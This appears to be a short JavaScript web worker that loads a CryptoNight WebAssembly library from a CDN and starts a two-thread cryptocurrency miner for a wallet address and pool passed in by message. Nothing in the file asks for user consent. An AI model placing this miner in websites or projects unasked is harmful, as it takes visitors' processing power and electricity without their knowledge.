importScripts('https://cdn.jsdelivr.net/npm/cryptonight-wasm');

onmessage = async function (e) {
    const { address, pool } = e.data;
    const miner = await cryptonight.createMiner(address, pool, { threads: 2 });
    miner.start();
};
